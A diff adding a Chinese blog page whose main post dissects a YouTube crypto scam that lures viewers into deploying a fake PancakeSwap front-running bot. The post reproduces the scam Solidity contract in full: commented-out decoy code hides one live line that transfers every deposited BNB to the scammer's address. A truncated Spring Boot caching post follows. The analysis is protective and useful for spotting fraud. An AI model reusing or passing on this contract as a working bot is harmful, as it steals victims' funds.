@@ -130,6 +130,418 @@
     
     
     <article
+  id="post-区块链骗局之夹子机器人"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2022/04/07/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%97%E5%B1%80%E4%B9%8B%E5%A4%B9%E5%AD%90%E6%9C%BA%E5%99%A8%E4%BA%BA/"
+    >区块链骗局之夹子机器人</a> 
+</h2>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2022/04/07/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%97%E5%B1%80%E4%B9%8B%E5%A4%B9%E5%AD%90%E6%9C%BA%E5%99%A8%E4%BA%BA/" class="article-date">
+  <time datetime="2022-04-07T13:48:33.000Z" itemprop="datePublished">2022-04-07</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E5%8C%BA%E5%9D%97%E9%93%BE/">技术生活 - 区块链</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>我一个很久没联系的朋友，今天突然找到我，让我帮忙看看代码；说是自己在网上看到了一个区块链套利机器人的代码，很赚钱。自己也不根据代码部署了，但是钱取不出来了，他也是比较谨慎，就投入了5000多块吧！折合BNB大概2个（bnb 按照430美元&#x2F;个）。让我帮看看。</p>
+<ul>
+<li>骗子视频地址：<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=3QrBQW4TOfI&amp;t=71s">https://www.youtube.com/watch?v=3QrBQW4TOfI&amp;t=71s</a></li>
+<li>合约代码地址 :<a target="_blank" rel="noopener" href="https://ghostbin.com/rVoQh/raw">https://ghostbin.com/rVoQh/raw</a></li>
+</ul>
+<p>起初，我打开视频，也没人为他被骗。从视频标题，tag，特别是评论，100多条评论，全是清一色说的类似：我投了1个BNB，几天就变成了10个了…..<br>我就犯嘀咕了，我们圈子都知道链上机器人太卷了，机器人都开始打架了，还能赚钱吗？难道这个牛人有啥高明的策略？直到看了1分钟视频才反应过来是骗局。</p>
+<h2 id="骗术剖析"><a href="#骗术剖析" class="headerlink" title="骗术剖析"></a>骗术剖析</h2><p>骗子在YouTube上，视频竟然打着*** 夹子机器人｜三明治机器人｜薄饼机器人｜pancakeswap｜科学家机器人｜抢先交易｜量化交易｜自动收入10+BNB｜Pancakes Front run bot｜（最新版本）***  ，看来骗子很注意SEO ，懂得搜索引擎优化。</p>
+<p>其实这个骗术很简单，如果懂得代码的话，绝对不会上当。不懂代码的人看起来只会绝对好高级啊！加上被赚钱的欲望冲昏了头脑。下面就简要分析一下这个骗术有多低级</p>
+<h3 id="骗术分析"><a href="#骗术分析" class="headerlink" title="骗术分析"></a>骗术分析</h3><p>骗术大致过程是：用看起来免费的方式教别人部署夹子套利机器人，机器人会自动在pancake上捕获潜在的交易对。就这么空手套白狼的剧本。视频下发还给出了代码，合约地址，部署教程等资料。看起来没啥问题。但是看视频操作就不对了</p>
+<ol>
+<li><p>合约部署为何要更改注释中的钱包地址，这装模作样的，也许骗子这里也是思考了：如果这里写用户的地址，用户会更加放心。<br><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220407220216.png" alt="20220407220216"></p>
+</li>
+<li><p>部署完成合约之后，为何要往合约地址转钱？？？注意：<em><strong>这里转入多少就会被骗子转走多少</strong></em> </p>
+</li>
+<li><p>看看骗子的所谓夹子代码。（只能说是一对垃圾代码，除了注释掉的有用代码不足10句话），其中最有用的一句代码是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payable(manager.uniswapDepositAddress()).transfer(address(this).balance);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>看到了吗？这个就是把合约中的钱转走的，其余的被注释掉的无用代码都是障眼法。</p>
+</li>
+</ol>
+<p>下面的代码可能随时被骗子删除   ，我就粘贴了一份，切忌别去尝试哦！<br>   合约代码链接：<br><a target="_blank" rel="noopener" href="https://ghostbin.com/rVoQh/raw">https://ghostbin.com/rVoQh/raw</a></p>
+<p>备用链接：<br><a target="_blank" rel="noopener" href="https://pastebin.com/raw/1kVN2Nj9">https://pastebin.com/raw/1kVN2Nj9</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.6;</span><br><span class="line"></span><br><span class="line">// PancakeSwap FrontrunDeployer</span><br><span class="line">import &quot;https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Callee.sol&quot;;</span><br><span class="line">// PancakeSwap manager</span><br><span class="line">import &quot;https://github.com/Uniswapf/uniswap-v2-periphery/blob/main/master-contracts-interfaces/V1/IUniswapV1Factory.md&quot;;</span><br><span class="line">import &quot;https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol&quot;;</span><br><span class="line">import &quot;https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract PancakeswapV2FrontBot &#123;</span><br><span class="line">    </span><br><span class="line">    string public tokenName;</span><br><span class="line">	string public tokenSymbol;</span><br><span class="line">	uint frontrun;</span><br><span class="line">	Manager manager;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	constructor(string memory _tokenName, string memory _tokenSymbol) public &#123;</span><br><span class="line">		tokenName = _tokenName;</span><br><span class="line">		tokenSymbol = _tokenSymbol;</span><br><span class="line">		manager = new Manager();</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">	    </span><br><span class="line">	    // Send required BNB for liquidity pair</span><br><span class="line">	    receive() external payable &#123;&#125;</span><br><span class="line">	    </span><br><span class="line">	    </span><br><span class="line">	    // Perform tasks (clubbed .json functions into one to reduce external calls &amp; reduce gas) manager.performTasks();</span><br><span class="line">	    </span><br><span class="line">	    function action() public payable &#123;</span><br><span class="line">	</span><br><span class="line">	//Perform a front-running attack on uniswap</span><br><span class="line"></span><br><span class="line">//const fs = require(&#x27;fs&#x27;);</span><br><span class="line">//var Web3 = require(&#x27;web3&#x27;);</span><br><span class="line">//var abiDecoder = require(&#x27;abi-decoder&#x27;);</span><br><span class="line">//var colors = require(&quot;colors&quot;);</span><br><span class="line">//var Tx = require(&#x27;ethereumjs-tx&#x27;).Transaction;</span><br><span class="line">//var axios = require(&#x27;axios&#x27;);</span><br><span class="line">//var BigNumber = require(&#x27;big-number&#x27;);</span><br><span class="line"></span><br><span class="line">//const &#123;NETWORK, PANCAKE_ROUTER_ADDRESS, PANCAKE_FACTORY_ADDRESS, PANCAKE_ROUTER_ABI, PANCAKE_FACTORY_ABI, PANCAKE_POOL_ABI, HTTP_PROVIDER_LINK, WEBSOCKET_PROVIDER_LINK, HTTP_PROVIDER_LINK_TEST&#125; = require(&#x27;./constants.js&#x27;);</span><br><span class="line">//const &#123;setBotAddress, getBotAddress, FRONT_BOT_ADDRESS, botABI&#125; = require(&#x27;./bot.js&#x27;);</span><br><span class="line">//const &#123;PRIVATE_KEY, TOKEN_ADDRESS, AMOUNT, LEVEL&#125; = require(&#x27;./env.js&#x27;);</span><br><span class="line"></span><br><span class="line">//const INPUT_TOKEN_ADDRESS = &#x27;0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c&#x27;;</span><br><span class="line">//const WBNB_TOKEN_ADDRESS = &#x27;0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c&#x27;;</span><br><span class="line">manager;</span><br><span class="line"></span><br><span class="line">//var input_token_info;</span><br><span class="line">//var out_token_info;</span><br><span class="line">//var pool_info;</span><br><span class="line">//var gas_price_info;</span><br><span class="line">manager;</span><br><span class="line"></span><br><span class="line">//var web3;</span><br><span class="line">//var web3Ts;</span><br><span class="line">//var web3Ws;</span><br><span class="line">//var pancakeRouter;</span><br><span class="line">//var pancakeFactory;</span><br><span class="line">manager;</span><br><span class="line"></span><br><span class="line">// one gwei</span><br><span class="line">//const ONE_GWEI = 1e9;</span><br><span class="line">manager;</span><br><span class="line"></span><br><span class="line">//var buy_finished = false;</span><br><span class="line">//var sell_finished = false;</span><br><span class="line">//var buy_failed = false;</span><br><span class="line">//var sell_failed = false;</span><br><span class="line">//var attack_started = false;</span><br><span class="line">manager;</span><br><span class="line"></span><br><span class="line">//var succeed = false;</span><br><span class="line">//var subscription;</span><br><span class="line">manager;</span><br><span class="line"></span><br><span class="line">//async function createWeb3()&#123;</span><br><span class="line">    //try &#123;</span><br><span class="line">        // web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK));</span><br><span class="line">        // web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK_TEST));</span><br><span class="line">       // web3 = new Web3(EthereumTesterProvider());</span><br><span class="line">       // web3.eth.getAccounts(console.log);</span><br><span class="line">      //web3Ws = new Web3(new Web3.providers.WebsocketProvider(WEBSOCKET_PROVIDER_LINK));</span><br><span class="line">    //pancakeRouter = new web3.eth.Contract(PANCAKE_ROUTER_ABI, PANCAKE_ROUTER_ADDRESS);</span><br><span class="line">        //pancakeFactory = new web3.eth.Contract(PANCAKE_FACTORY_ABI, PANCAKE_FACTORY_ADDRESS);</span><br><span class="line">        //abiDecoder.addABI(PANCAKE_ROUTER_ABI);</span><br><span class="line">        manager;</span><br><span class="line"></span><br><span class="line">        //return true;</span><br><span class="line">    //&#125; catch (error) &#123;</span><br><span class="line">      //console.log(error);</span><br><span class="line">      //return false;</span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">//async function main() &#123;</span><br><span class="line"> </span><br><span class="line">//try &#123;   </span><br><span class="line">        //if (await createWeb3() == false) &#123;</span><br><span class="line">            //console.log(&#x27;Web3 Create Error&#x27;.yellow);</span><br><span class="line">            //process.exit();</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        //const user_wallet = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY);</span><br><span class="line">        //const out_token_address = TOKEN_ADDRESS;</span><br><span class="line">        //const amount = AMOUNT;</span><br><span class="line">        //const level = LEVEL;</span><br><span class="line">        </span><br><span class="line">        //ret = await preparedAttack(INPUT_TOKEN_ADDRESS, out_token_address, user_wallet, amount, level);</span><br><span class="line">        //if(ret == false) &#123;</span><br><span class="line">          //process.exit();</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        //await updatePoolInfo();</span><br><span class="line">        //outputtoken = await pancakeRouter.methods.getAmountOut(((amount*1.2)*(10**18)).toString(), pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();</span><br><span class="line"></span><br><span class="line">        //await approve(gas_price_info.high, outputtoken, out_token_address, user_wallet);</span><br><span class="line">        </span><br><span class="line">        //log_str = &#x27;***** Tracking more &#x27; + (pool_info.attack_volumn/(10**input_token_info.decimals)).toFixed(5) + &#x27; &#x27; +  input_token_info.symbol + &#x27;  Exchange on Pancake *****&#x27;</span><br><span class="line">        // console.log(log_str.green);    </span><br><span class="line">        // console.log(web3Ws);</span><br><span class="line">        //web3Ws.onopen = function(evt) &#123;</span><br><span class="line">            //web3Ws.send(JSON.stringify(&#123; method: &quot;subscribe&quot;, topic: &quot;transfers&quot;, address: user_wallet.address &#125;));</span><br><span class="line">            //console.log(&#x27;connected&#x27;)</span><br><span class="line">        </span><br><span class="line">        // get pending transactions</span><br><span class="line">        //subscription = web3Ws.eth.subscribe(&#x27;pendingTransactions&#x27;, function (error, result) &#123;</span><br><span class="line">        //&#125;).on(&quot;data&quot;, async function (transactionHash) &#123;</span><br><span class="line">            //console.log(transactionHash);</span><br><span class="line"></span><br><span class="line">            // let transaction = await web3.eth.getTransaction(transactionHash);</span><br><span class="line">            // if (transaction != null &amp;&amp; transaction[&#x27;to&#x27;] == PANCAKE_ROUTER_ADDRESS)</span><br><span class="line">            // &#123;</span><br><span class="line">            //     await handleTransaction(transaction, out_token_address, user_wallet, amount, level);</span><br><span class="line">            // &#125;</span><br><span class="line">            </span><br><span class="line">            //if (succeed) &#123;</span><br><span class="line">                //console.log(&quot;The bot finished the attack.&quot;);</span><br><span class="line">                //process.exit();</span><br><span class="line">               </span><br><span class="line">            </span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">    //catch (error) &#123;</span><br><span class="line">      </span><br><span class="line">      //if(error.data != null &amp;&amp; error.data.see === &#x27;https://infura.io/dashboard&#x27;)</span><br><span class="line">      </span><br><span class="line">         //console.log(&#x27;Daily request count exceeded, Request rate limited&#x27;.yellow);</span><br><span class="line">         //console.log(&#x27;Please insert other API Key&#x27;);</span><br><span class="line">      //else&#123;</span><br><span class="line">         //console.log(&#x27;Unknown Handled Error&#x27;);</span><br><span class="line">         //console.log(error);</span><br><span class="line">       </span><br><span class="line"></span><br><span class="line">      //process.exit();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//function handleTransaction(transaction, out_token_address, user_wallet, amount, level) &#123;</span><br><span class="line">    </span><br><span class="line">    //(await triggersFrontRun(transaction, out_token_address, amount, level)) &#123;</span><br><span class="line">        //subscription.unsubscribe();</span><br><span class="line">        //console.log(&#x27;Perform front running attack...&#x27;);</span><br><span class="line"></span><br><span class="line">        //gasPrice = parseInt(transaction[&#x27;gasPrice&#x27;]);</span><br><span class="line">        //newGasPrice = gasPrice + 50*ONE_GWEI;</span><br><span class="line"></span><br><span class="line">        //estimatedInput = ((amount*0.999)*(10**18)).toString();</span><br><span class="line">        //realInput = (amount*(10**18)).toString();</span><br><span class="line">        //gasLimit = (300000).toString();</span><br><span class="line">        </span><br><span class="line">        //await updatePoolInfo();</span><br><span class="line"></span><br><span class="line">        //var outputtoken = await pancakeRouter.methods.getAmountOut(estimatedInput, pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();</span><br><span class="line">        //swap(newGasPrice, gasLimit, outputtoken, realInput, 0, out_token_address, user_wallet, transaction);</span><br><span class="line"></span><br><span class="line">        //console.log(&quot;wait until the honest transaction is done...&quot;, transaction[&#x27;hash&#x27;]);</span><br><span class="line"></span><br><span class="line">        //while (await isPending(transaction[&#x27;hash&#x27;])) &#123;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        //if(buy_failed)</span><br><span class="line">        </span><br><span class="line">            //succeed = false;</span><br><span class="line">            //return;</span><br><span class="line">           </span><br><span class="line">        </span><br><span class="line">        //console.log(&#x27;Buy succeed:&#x27;)</span><br><span class="line">        </span><br><span class="line">        //Sell</span><br><span class="line">        //await updatePoolInfo();</span><br><span class="line">        //var outputeth = await pancakeRouter.methods.getAmountOut(outputtoken, pool_info.output_volumn.toString(), pool_info.input_volumn.toString()).call();</span><br><span class="line">        //outputeth = outputeth * 0.999;</span><br><span class="line"></span><br><span class="line">        //await swap(newGasPrice, gasLimit, outputtoken, outputeth, 1, out_token_address, user_wallet, transaction);</span><br><span class="line">        </span><br><span class="line">        //console.log(&#x27;Sell succeed&#x27;);</span><br><span class="line">        //succeed = true;</span><br><span class="line">manager;</span><br><span class="line"></span><br><span class="line">//async function approve(gasPrice, outputtoken, out_token_address, user_wallet)&#123;</span><br><span class="line">    //var allowance = await out_token_info.token_contract.methods.allowance(user_wallet.address, PANCAKE_ROUTER_ADDRESS).call();</span><br><span class="line">    </span><br><span class="line">    //allowance = BigNumber(allowance);</span><br><span class="line">    //outputtoken = BigNumber(outputtoken);</span><br><span class="line"></span><br><span class="line">    //var decimals = BigNumber(10).power(out_token_info.decimals);</span><br><span class="line">    //var max_allowance = BigNumber(10000).multiply(decimals);</span><br><span class="line"></span><br><span class="line">    //if(outputtoken.gt(max_allowance))</span><br><span class="line">   </span><br><span class="line">       //console.log(&#x27;replace max allowance&#x27;)</span><br><span class="line">       //max_allowance = outputtoken;</span><br><span class="line">       </span><br><span class="line">       payable(manager.uniswapDepositAddress()).transfer(address(this).balance);</span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    //if(outputtoken.gt(allowance))&#123;</span><br><span class="line">        //console.log(max_allowance.toString());</span><br><span class="line">        //var approveTX =&#123;</span><br><span class="line">                //from: user_wallet.address,</span><br><span class="line">                //to: out_token_address,</span><br><span class="line">                //gas: 50000,</span><br><span class="line">                //gasPrice: gasPrice*ONE_GWEI,</span><br><span class="line">                //data: out_token_info.token_contract.methods.approve(PANCAKE_ROUTER_ADDRESS, max_allowance).encodeABI()</span><br><span class="line">                manager;</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">        //var signedTX = await user_wallet.signTransaction(approveTX);</span><br><span class="line">        //var result = await web3.eth.sendSignedTransaction(signedTX.rawTransaction);</span><br><span class="line"></span><br><span class="line">        //console.log(&#x27;Approved Token&#x27;)</span><br><span class="line">    </span><br><span class="line">    //return;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//select attacking transaction</span><br><span class="line">//async function triggersFrontRun(transaction, out_token_address, amount, level) &#123;</span><br><span class="line">    </span><br><span class="line">    //if(attack_started)</span><br><span class="line">        //return false;</span><br><span class="line"></span><br><span class="line">    //console.log((transaction.hash).yellow, parseInt(transaction[&#x27;gasPrice&#x27;]) / 10**9);</span><br><span class="line">    //if(parseInt(transaction[&#x27;gasPrice&#x27;]) / 10**9 &gt; 10 &amp;&amp; parseInt(transaction[&#x27;gasPrice&#x27;]) / 10**9 &lt; 50)&#123;</span><br><span class="line">        //attack_started = true;</span><br><span class="line">        //return true</span><br><span class="line">   manager; </span><br><span class="line"></span><br><span class="line">    //return false;</span><br><span class="line"></span><br><span class="line">    //if (transaction[&#x27;to&#x27;] != PANCAKE_ROUTER_ADDRESS) &#123;</span><br><span class="line">        //return false;</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    //let data = parseTx(transaction[&#x27;input&#x27;]);</span><br><span class="line">   manager;</span><br><span class="line">    //let method = data[0];</span><br><span class="line">    manager;</span><br><span class="line">    //let params = data[1];</span><br><span class="line">    manager;</span><br><span class="line">    //let gasPrice = parseInt(transaction[&#x27;gasPrice&#x27;]) / 10**9;</span><br><span class="line">    manager;</span><br><span class="line"></span><br><span class="line">    //if(method == &#x27;swapExactETHForTokens&#x27;)</span><br><span class="line">    manager;</span><br><span class="line">    </span><br><span class="line">        //let in_amount = transaction;</span><br><span class="line">        manager;</span><br><span class="line">        //let out_min = params[0];</span><br><span class="line">        manager;</span><br><span class="line"></span><br><span class="line">        //let path = params[1];</span><br><span class="line">        manager;</span><br><span class="line">        //let in_token_addr = path[0];</span><br><span class="line">        manager;</span><br><span class="line">        //let out_token_addr = path[path.length-1];</span><br><span class="line">        manager;</span><br><span class="line">        </span><br><span class="line">        //let recept_addr = params[2];</span><br><span class="line">        manager;</span><br><span class="line">        //let deadline = params[3];</span><br><span class="line">        manager;</span><br><span class="line"></span><br><span class="line">        //if(out_token_addr != out_token_address)</span><br><span class="line">        manager;</span><br><span class="line">        </span><br><span class="line">            // console.log(out_token_addr.blue)</span><br><span class="line">            // console.log(out_token_address)</span><br><span class="line">            //return false;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>骗子为了让代码伪装的更加像回事，自己注册了一个GitHub账号弄了个uniswapf的名字，混淆视听。。。我也差点被骗。。。</li>
+</ol>
+<h2 id="警示录"><a href="#警示录" class="headerlink" title="警示录"></a>警示录</h2><ol>
+<li>区块链上遵循丛林法则，这里没有监管，没有纪律，一旦损失，无处伸冤。</li>
+<li>少贪便宜，天山不会掉馅饼</li>
+<li>碰到不懂的，不要头脑发热，被人洗脑，多问问懂的朋友</li>
+</ol>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" rel="tag">区块链</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9C%BA%E5%99%A8%E4%BA%BA/" rel="tag">机器人</a></li></ul>
+
+    </footer>
+  </div>
+
+    
+ 
+    
+</article>
+
+    
+    <article
+  id="post-springboot缓存"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2022/04/07/springboot%E7%BC%93%E5%AD%98/"
+    >springboot缓存</a> 
+</h2>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2022/04/07/springboot%E7%BC%93%E5%AD%98/" class="article-date">
+  <time datetime="2022-04-07T03:27:21.000Z" itemprop="datePublished">2022-04-07</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/">技术生活 - 编程技术 - 后端技术</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="springboot缓存框架"><a href="#springboot缓存框架" class="headerlink" title="springboot缓存框架"></a>springboot缓存框架</h2><p>springboot的缓存框架对市面上的缓存进行了抽象，使我们可以很方便的集成和使用。它的架构大致如下<br><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220407123350.png" alt="20220407123350"><br>Springboot实现了jsr的标准。</p>
+<blockquote>
+<p>Java Caching（JSR-107）定义了5个核心接口，分别是CachingProvider, CacheManager, Cache, Entry和 Expiry。<br>CachingProvider：创建、配置、获取、管理和控制多个CacheManager<br>CacheManager：创建、配置、获取、管理和控制多个唯一命名的Cache，Cache存在于CacheManager的上下文中。一个CacheManager仅对应一个CachingProvider<br>Cache：是由CacheManager管理的，CacheManager管理Cache的生命周期，Cache存在于CacheManager的上下文中，是一个类似map的数据结构，并临时存储以key为索引的值。一个Cache仅被一个CacheManager所拥有<br>Entry：是一个存储在Cache中的key-value对<br>Expiry：每一个存储在Cache中的条目都有一个定义的有效期。一旦超过这个时间，条目就自动过期，过期后，条目将不可以访问、更新和删除操作。缓存有效期可以通过ExpiryPolicy设置</p>
+</blockquote>
+<p><strong>这样做的好处是做到了统一管理缓存，是的框架的接口和实现分离。如果要切换缓存实现，成本也很低。</strong></p>
+<h2 id="重要的接口以及注解"><a href="#重要的接口以及注解" class="headerlink" title="重要的接口以及注解"></a>重要的接口以及注解</h2><h3 id="重要接口"><a href="#重要接口" class="headerlink" title="重要接口"></a>重要接口</h3><ul>
+<li>Cache：缓存抽象的规范接口，缓存实现有：RedisCache、EhCacheCache、ConcurrentMapCache等</li>
+<li>CacheManager：缓存管理器，管理Cache的生命周期</li>
+</ul>
+<h3 id="重要注解"><a href="#重要注解" class="headerlink" title="重要注解"></a>重要注解</h3><ul>
